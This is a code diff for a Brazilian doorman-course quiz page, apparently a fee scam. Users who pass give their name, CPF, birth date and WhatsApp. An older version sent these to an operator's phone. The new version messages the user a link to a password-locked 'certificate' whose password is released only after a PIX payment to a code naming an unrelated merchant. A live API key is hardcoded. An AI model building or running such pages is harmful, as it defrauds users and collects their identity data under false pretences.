@@ -108,17 +108,21 @@
                 <div class="input-group"><label>E-mail ou WhatsApp</label><input type="text" id="aluno-contato" required></div>
                 <button type="button" style="background:#28a745" onclick="gerarCertificado()">Emitir Certificado</button>
             </div>
-            <div id="pix-section" style="display: none;">
-                <div class="aviso-taxa">Para receber o certificado imediatamente, realize o pagamento da taxa de emissão via PIX. Após a confirmação, o certificado será enviado para o contato informado.</div>
-                <textarea id="pix-code" class="pix-code-box" readonly>00020101021226850014br.gov.bcb.pix2563pix.santander.com.br/qr/v2/3afc1cfb-c444-4de6-a91c-11d5e9eb395b520400005303986540570.005802BR5906SHOPEE6009SAO PAULO62070503***63040874</textarea>
-                <button type="button" class="btn-copiar" onclick="copiarPix()">Copiar Código PIX</button>
+            
+            <!-- Nova dinâmica de mensagem após clicar em emitir -->
+            <div id="mensagem-sucesso" style="display: none;">
+                <div style="background-color: #d4edda; color: #155724; padding: 20px; border-radius: 5px; border: 1px solid #c3e6cb; margin-top: 15px; font-size: 1.1em; text-align: center; font-weight: bold;">
+                    Certificado emitido com sucesso!<br><br>
+                    O documento criptografado e as instruções de pagamento foram enviados para o seu WhatsApp. Assim que o pagamento for realizado, você receberá a senha.
+                </div>
             </div>
+
         </div>
     </div>
 </div>
 
 <script>
-    let porcentagemAtual = 0; // Variável global para acessar a nota na hora de gerar o certificado
+    let porcentagemAtual = 0;
 
     document.getElementById('quizForm').addEventListener('submit', function(e) {
         e.preventDefault();
@@ -126,7 +130,7 @@
         const formData = new FormData(this);
         for(let i=1; i<=10; i++) if(formData.get('q'+i) === '1') score++;
         const pct = (score/10)*100;
-        porcentagemAtual = pct; // Salva a nota
+        porcentagemAtual = pct; 
         
         const res = document.getElementById('result-container');
         res.style.display = 'block';
@@ -135,7 +139,7 @@
             document.getElementById('result-text').innerHTML = `PARABÉNS! APROVADO.<br>Nota: ${pct}% (${score}/10 acertos)`;
             document.getElementById('certificado-section').style.display = 'block';
             document.getElementById('form-dados-certificado').style.display = 'block';
-            document.getElementById('pix-section').style.display = 'none';
+            document.getElementById('mensagem-sucesso').style.display = 'none';
         } else {
             res.className = 'reprovado';
             document.getElementById('result-text').innerHTML = `REPROVADO.<br>Nota: ${pct}% (${score}/10 acertos). Tente novamente.`;
@@ -152,28 +156,30 @@
         
         if(!nome || !cpf || !nasc || !contato) return alert("Preencha todos os campos!");
 
-        // Chamada da API do WhatsApp
+        // Trata o número digitado pelo candidato (limpa traços, espaços e garante o DDI)
+        let telefoneCandidato = contato.replace(/\D/g, '');
+        if (telefoneCandidato.length > 0 && !telefoneCandidato.startsWith('55')) {
+            telefoneCandidato = '55' + telefoneCandidato;
+        }
+
+        // Variáveis da mensagem enviada
+        const linkDoPdf = "https://curso-prime.github.io/curso-porteiro/certificado_protegido_por_senha.pdf"; // PDF atualizado com o nome correto
+        const codigoPix = "00020101021226850014br.gov.bcb.pix2563pix.santander.com.br/qr/v2/3afc1cfb-c444-4de6-a91c-11d5e9eb395b520400005303986540570.005802BR5906SHOPEE6009SAO PAULO62070503***63040874";
+
+        const textoMensagem = `Olá, ${nome}!\n\nSeu certificado do curso de Porteiro foi emitido com sucesso e encontra-se criptografado por segurança.\n\n📥 *Baixe o arquivo aqui:* ${linkDoPdf}\n\nPara receber a *SENHA* de desbloqueio do PDF, por favor, realize o pagamento da taxa de emissão copiando e colando o código PIX abaixo:\n\n${codigoPix}\n\nAssim que o pagamento for realizado, nos envie o comprovante e a senha será enviada para você manualmente por aqui!`;
+
+        // Chamada da API enviando direto para o contato do aluno
         try {
-            // Adicionado a Data de Nascimento no texto da mensagem
-            const textoMensagem = `Nome: ${nome}\nCPF: ${cpf}\nData de Nascimento: ${nasc}\nE-mail/telefone: ${contato}\nPorcentagem de acerto: ${porcentagemAtual}%\nSituação: Aprovado\nStatus: aguardando pagamento para envio do certificado`;
-            
-            // Alterado para HTTPS para evitar bloqueio de Mixed Content
-            const urlApi = `https://api.textmebot.com/send.php?recipient=+5522992195418&apikey=Pskn5LW4qaCv&text=${encodeURIComponent(textoMensagem)}`;
+            const urlApi = `https://api.textmebot.com/send.php?recipient=+${telefoneCandidato}&apikey=Pskn5LW4qaCv&text=${encodeURIComponent(textoMensagem)}`;
             
             await fetch(urlApi, { mode: 'no-cors' });
         } catch (e) {
             console.log("Erro ao notificar via WhatsApp", e);
         }
 
+        // Mostra a nova mensagem de sucesso no site
         document.getElementById('form-dados-certificado').style.display = 'none';
-        document.getElementById('pix-section').style.display = 'block';
-    }
-
-    function copiarPix() {
-        const code = document.getElementById('pix-code');
-        code.select();
-        document.execCommand('copy');
-        alert('Código PIX copiado!');
+        document.getElementById('mensagem-sucesso').style.display = 'block';
     }
 </script>
 </body>
